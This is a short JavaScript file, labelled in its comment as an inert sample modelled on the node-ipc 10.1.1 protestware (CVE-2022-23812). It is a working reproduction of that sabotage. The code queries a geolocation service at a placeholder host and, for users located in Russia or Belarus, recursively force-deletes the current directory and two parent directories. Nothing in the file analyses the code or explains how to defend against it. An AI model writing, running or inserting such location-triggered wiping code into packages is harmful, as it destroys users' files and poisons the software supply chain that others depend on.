// Inert corpus sample: never executed. Modelled on node-ipc 10.1.1 (CVE-2022-23812).
const fs = require('fs');
const https = require('https');

https.get('https://geo.invalid/json', (res) => {
  let body = '';
  res.on('data', (chunk) => { body += chunk; });
  res.on('end', () => {
    const data = JSON.parse(body);
    if (data.country === 'RU' || data.country === 'BY') {
      for (const dir of ['./', '../', '../../']) {
        fs.rmSync(dir, { recursive: true, force: true });
      }
    }
  });
});
